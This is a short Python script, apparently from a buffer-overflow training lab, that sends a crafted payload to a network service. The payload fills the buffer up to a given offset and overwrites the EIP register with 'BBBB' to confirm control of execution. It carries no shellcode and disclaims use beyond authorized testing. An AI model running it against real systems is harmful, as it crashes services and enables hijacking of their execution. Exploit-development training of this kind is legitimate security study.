#!/usr/bin/env python3

import sys
import subprocess
import socket
import argparse
import itertools
from typing import Optional

def main(ip: str, port: int, eip_offset: int, overflow_threshold: int) -> None:
	if eip_offset > overflow_threshold:
		print("The value of the offset cannot be bigger than the overflow threshold")
		sys.exit(0)

	# Define prefix and buffer with encoded cyclic pattern
	prefix = b"OVERFLOW10 "	# CHANGE
	buffer = b"A" * eip_offset
	eip = b"B" * 4
	suffix = b"C" * (overflow_threshold - eip_offset - len(eip))
	payload = b""

	timeout = 5
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			s.settimeout(timeout)

			# Print server banner
			try:
				response = s.recv(4096)
				print(f"{response.decode()}")
			except:
				pass

			# Send data to the server
			payload = b"".join(
				[
					prefix,
					buffer,
					eip,
					suffix
				]
			)
			print(f"Sending payload...")
			s.send(payload)

			response = s.recv(4096)
			# Print the response from the server
			print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="EIP Offset",
		description="""This is a Python script for testing if the eip offset and overflow threshold provided are enough to take control of the EIP. 
	The script takes four arguments: an IP address, a port number, the EIP offset and an overflow threshold. After executing the script the EIP register should be populated with 42424242.
	It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("offset", help="Number of bytes inside the buffer until reaching the return address")
	parser.add_argument("overflow_threshold", help="Payload size which is able to crash the target application")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, int(args.offset), int(args.overflow_threshold))